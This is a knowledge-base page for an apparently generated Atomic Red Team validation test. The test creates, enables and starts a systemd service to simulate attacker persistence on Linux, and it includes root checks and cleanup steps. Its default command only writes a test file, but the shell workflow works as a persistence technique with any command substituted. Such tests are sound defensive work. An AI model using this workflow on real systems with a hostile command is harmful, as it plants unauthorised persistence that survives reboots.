---
atomic_guid: "e58c8723-5503-4533-b642-535cd20ec648"
title: "Create and Enable a Malicious systemd Service Unit"
framework: "atomic"
generated: "true"
attack_technique_id: "T1569.003"
attack_technique_name: "System Services: Systemctl"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1569.003/T1569.003.yaml"
build_date: "2026-04-27 19:12:28"
executor: "sh"
aliases:
  - "e58c8723-5503-4533-b642-535cd20ec648"
  - "Create and Enable a Malicious systemd Service Unit"
platforms:
  - "linux"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Creates a new systemd service unit file in /etc/systemd/system/ and enables it using
systemctl enable followed by systemctl start. Adversaries commonly abuse this workflow
to establish persistence or execute arbitrary commands under the context of systemd.

This simulates the full attacker workflow: writing the unit file, reloading the systemd
daemon, enabling the service to survive reboots, and starting it immediately. This is
consistent with techniques observed in ransomware precursor activity and post-exploitation
frameworks targeting Linux infrastructure.

## ATT&CK Mapping

- [[kb/attack/techniques/T1569-system_services#^t1569003-systemctl|T1569.003: Systemctl]]

## Input Arguments

### command_to_run

- description: Command the service will execute
- type: string
- default: /bin/bash -c "echo atomictest > /tmp/atomic_service_output.txt"

### service_name

- description: Name of the malicious service to create
- type: string
- default: atomic-test

## Dependencies

systemctl must be available on the system

### Prerequisite Check

```bash
if [ -x "$(command -v systemctl)" ]; then exit 0; else exit 1; fi
```

### Get Prerequisite

```bash
echo "systemctl is not available. Ensure systemd is running on this system."
```

The test must be run as root or with sudo privileges

### Prerequisite Check

```bash
if [ "$(id -u)" -eq 0 ]; then exit 0; else exit 1; fi
```

### Get Prerequisite

```bash
echo "This test requires root privileges. Run as root or use sudo."
```

/etc/systemd/system/ directory must exist and be writable

### Prerequisite Check

```bash
if [ -d "/etc/systemd/system" ] && [ -w "/etc/systemd/system" ]; then exit 0; else exit 1; fi
```

### Get Prerequisite

```bash
echo "/etc/systemd/system/ does not exist or is not writable. Ensure systemd is installed."
```

## Executor

- elevation_required: True
- name: sh

### Command

```bash
echo "[Unit]" > /etc/systemd/system/#{service_name}.service
echo "Description=Atomic Test Service" >> /etc/systemd/system/#{service_name}.service
echo "After=network.target" >> /etc/systemd/system/#{service_name}.service
echo "" >> /etc/systemd/system/#{service_name}.service
echo "[Service]" >> /etc/systemd/system/#{service_name}.service
echo "ExecStart=#{command_to_run}" >> /etc/systemd/system/#{service_name}.service
echo "Restart=on-failure" >> /etc/systemd/system/#{service_name}.service
echo "" >> /etc/systemd/system/#{service_name}.service
echo "[Install]" >> /etc/systemd/system/#{service_name}.service
echo "WantedBy=multi-user.target" >> /etc/systemd/system/#{service_name}.service
systemctl daemon-reload
systemctl enable #{service_name}.service
systemctl start #{service_name}.service
systemctl status #{service_name}.service
```

### Cleanup

```bash
systemctl stop #{service_name}.service 2>/dev/null || true
systemctl disable #{service_name}.service 2>/dev/null || true
rm -f /etc/systemd/system/#{service_name}.service
systemctl daemon-reload
rm -f /tmp/atomic_service_output.txt
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1569.003/T1569.003.yaml)
